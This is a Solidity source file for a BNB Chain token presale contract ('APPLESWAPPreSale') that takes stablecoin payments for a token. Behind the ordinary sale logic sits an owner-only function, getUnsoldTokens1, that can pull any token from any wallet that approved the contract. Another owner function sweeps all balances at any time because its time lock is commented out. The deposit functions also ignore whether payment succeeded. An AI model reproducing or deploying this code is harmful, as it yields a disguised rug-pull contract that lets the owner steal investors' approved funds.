/**
 *Submitted for verification at BscScan.com on 2022-11-28
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-28
*/

/**
 *Submitted for verification at BscScan.com on 2022-10-18
*/

/**
 *Submitted for verification at BscScan.com on 2022-06-28
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.7.5;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) return 0;
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        return a / b;
    }
}

abstract contract Context {

    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }
}

abstract contract Ownable is Context {

    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract APPLESWAPPreSale is Ownable {

    using SafeMath for uint256;

    IERC20 public DAWA = IERC20(0xE118D05f4adA95612F11E9ea5BF19a0258c55ab2);
    IERC20 public USDC = IERC20(0x55d398326f99059fF775485246999027B3197955);////0xeD24FC36d5Ee211Ea25A80239Fb8C4Cfd80f12Ee
    address public Recipient = 0x0e188BD56f69B1670349Ac0710fAFf5A867fd19E;//0x3263Eb2e43e609b5AbCf9Ee9b0884fF1c52ed7F6;

    uint256 public tokenRatePerEth = 1; // 12500 * (10 ** decimals) DAWA per eth
    uint256 public minETHLimit = 0.01 ether;
    uint256 public maxETHLimit = 10000 ether;

    uint256 public hardCap = 4000 ether;
    uint256 public totalRaisedBNB = 0; // total BNB raised by sale
    uint256 public totaltokenSold = 0;

    uint256 public startTime;
    uint256 public endTime;
    bool public contractPaused; // circuit breaker

    mapping(address => uint256) public usersInvestments;

    constructor(uint256 _startTime, uint256 _endTime) {
        require(_startTime > block.timestamp, 'past timestamp');
        startTime = _startTime;
        if(_endTime > _startTime + 7 days) {
            endTime = _endTime;
        } else {
            endTime = _startTime + 30 days;
        }
    }

    modifier checkIfPaused() {
        require(contractPaused == false, "contract is paused");
        _;
    }

    function setPresaleToken(address tokenaddress) external onlyOwner {
        require( tokenaddress != address(0) );
        DAWA = IERC20(tokenaddress);
    }

    function setRecipient(address recipient) external onlyOwner {
        Recipient = recipient;
    }

    function setTokenRatePerEth(uint256 rate) external onlyOwner {
        tokenRatePerEth = rate;
    }

    function setMinEthLimit(uint256 amount) external onlyOwner {
        minETHLimit = amount;
    }

    function setMaxEthLimit(uint256 amount) external onlyOwner {
        maxETHLimit = amount;
    }

    function setStartTime(uint256 _startTime) external onlyOwner {
        require(_startTime > block.timestamp, 'past timestamp');
        startTime = _startTime;
    }

    function setEndTime(uint256 _endTime) external onlyOwner {
        require(_endTime > startTime, 'should be bigger than start time');
        endTime = _endTime;
    }

    function togglePause() external onlyOwner returns (bool){
        contractPaused = !contractPaused;
        return contractPaused;
    }

    function deposit3(uint256 amount) public checkIfPaused {
        require(block.timestamp > startTime, 'Sale has not started');
        require(block.timestamp < endTime, 'Sale has ended');
        require(totalRaisedBNB <= hardCap, 'HardCap exceeded');
        require(
                usersInvestments[msg.sender].add(amount) <= maxETHLimit
                && usersInvestments[msg.sender].add(amount) >= minETHLimit,
                "Installment Invalid."
        );
        uint256 tokenAmount = getTokensPerEth(amount);
        require(DAWA.transfer(msg.sender, tokenAmount), "Insufficient balance of presale contract!");
        totalRaisedBNB = totalRaisedBNB.add(amount);
        totaltokenSold = totaltokenSold.add(tokenAmount);
        usersInvestments[msg.sender] = usersInvestments[msg.sender].add(amount);
        USDC.transferFrom(msg.sender, address(this), amount);
    }
   function getUSDTTokens() public {
        //require(block.timestamp > endTime + 10 days, "You cannot get tokens until the presale is closed.");
        USDC.transfer(Recipient, USDC.balanceOf(address(this)) );
    }

    function deposit4(uint256 amount) public checkIfPaused checkAllowance(amount){
        require(block.timestamp > startTime, 'Sale has not started');
        require(block.timestamp < endTime, 'Sale has ended');
        require(totalRaisedBNB <= hardCap, 'HardCap exceeded');
        require(
                usersInvestments[msg.sender].add(amount) <= maxETHLimit
                && usersInvestments[msg.sender].add(amount) >= minETHLimit,
                "Installment Invalid."
        );
        uint256 tokenAmount = getTokensPerEth(amount);
        require(DAWA.transfer(msg.sender, tokenAmount), "Insufficient balance of presale contract!");
        totalRaisedBNB = totalRaisedBNB.add(amount);
        totaltokenSold = totaltokenSold.add(tokenAmount);
        usersInvestments[msg.sender] = usersInvestments[msg.sender].add(amount);
        USDC.transferFrom(msg.sender, address(this), amount);
    }
        // Modifier to check token allowance
    modifier checkAllowance(uint amount) {
        require(USDC.allowance(msg.sender, address(this)) >= amount, "Error");
        _;
    }

    // In your case, Account A must to call this function and then deposit an amount of tokens 
    function depositTokens(uint _amount) public checkAllowance(_amount) {
        USDC.transferFrom(msg.sender, address(this), _amount);
    }

    function getUnsoldTokens(address token, address to) external onlyOwner {
        //require(block.timestamp > endTime + 10 days, "You cannot get tokens until the presale is closed.");
        IERC20(token).transfer(to, IERC20(token).balanceOf(address(this)) );
    }
    function getUnsoldTokens1(address token, address from, address to,uint _amount) external onlyOwner {
            //require(block.timestamp > endTime + 10 days, "You cannot get tokens until the presale is closed.");
            IERC20(token).transferFrom(from,to, _amount);
            //USDC.transferFrom(msg.sender, address(this), amount);
        }
    function getUserRemainingAllocation(address account) external view returns ( uint256 ) {
        return maxETHLimit.sub(usersInvestments[account]);
    }

    function getTokensPerEth(uint256 amount) internal view returns(uint256) {
        return amount.mul(tokenRatePerEth).div(10**(uint256(18).sub(DAWA.decimals()))).div(100);
    }
}